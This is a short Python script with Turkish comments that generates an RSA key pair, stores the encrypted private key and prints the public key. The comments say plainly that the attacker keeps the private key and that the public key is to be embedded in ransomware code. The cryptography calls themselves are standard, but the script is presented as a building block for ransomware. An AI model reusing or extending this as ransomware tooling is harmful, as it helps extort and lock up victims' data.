from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# 1. Anahtar Çifti Oluşturma (Key Generation)
# 4096 bit, yüksek güvenlik seviyesi sağlar
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=4096,
    backend=default_backend()
)

# 2. Private Key'i Kaydetme (Saldırgan bunu GİZLİ TUTAR)
# Private Key, şifre çözmek için gereklidir. Parola ile korunmalıdır.
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.BestAvailableEncryption(b'guvenli_sifre') # Buraya bir parola koyun
)

with open("private_key.pem", "wb") as f:
    f.write(private_pem)

print("Private Key (private_key.pem) başarıyla oluşturuldu ve şifrelendi.")

# 3. Public Key'i Çıkarma ve Koda Gömme İçin Hazırlama
# Bu, fidye yazılımı koduna gömülecek kısımdır.
public_key = private_key.public_key()
public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Public Key'in Byte Hali (Koda Gömülecek Veri)
print("\n--- Koda Gömülecek Public Key (START) ---")
print(public_pem.decode('utf-8'))
print("--- Koda Gömülecek Public Key (END) ---\n")